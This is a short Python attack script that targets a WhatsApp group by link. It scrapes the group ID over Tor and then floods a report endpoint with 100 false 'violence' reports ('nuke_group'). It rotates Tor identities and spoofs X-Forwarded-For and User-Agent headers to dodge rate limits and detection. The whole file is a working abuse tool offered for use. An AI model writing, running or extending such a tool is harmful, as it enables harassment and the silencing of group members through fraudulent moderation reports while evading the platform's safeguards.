import sys, requests, random, time  
from stem import Signal  
from stem.control import Controller  
from bs4 import BeautifulSoup  
from fake_useragent import UserAgent  

def rotate_ip():  
    with Controller.from_port(port=9051) as c:  
        c.authenticate()  
        c.signal(Signal.NEWNYM)  

def extract_group_data(link):  
    # Bypass WA link protection  
    ua = UserAgent()  
    headers = {'User-Agent': ua.random}  
    res = requests.get(link, headers=headers, proxies={'http': 'socks5://127.0.0.1:9050'})  
    soup = BeautifulSoup(res.text, 'html.parser')  
    group_id = soup.find('meta', {'property': 'og:url'})['content'].split('/')[-1]  
    return group_id  

def nuke_group(group_id):  
    report_url = f"https://web.whatsapp.com/api/report?context=group&id={group_id}"  
    for _ in range(100):  # 100 reports per member  
        headers = {  
            'X-Forwarded-For': f'{random.randint(11,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',  
            'User-Agent': UserAgent().random  
        }  
        requests.post(report_url, headers=headers, data={'reason': 'violence'})  
        if _ % 10 == 0:  
            rotate_ip()  

if __name__ == "__main__":  
    print("[!] Run scripts/wa_header.sh first!")  
    link = input("[+] Enter WA Group Link: ")  
    group_id = extract_group_data(link)  
    nuke_group(group_id)  
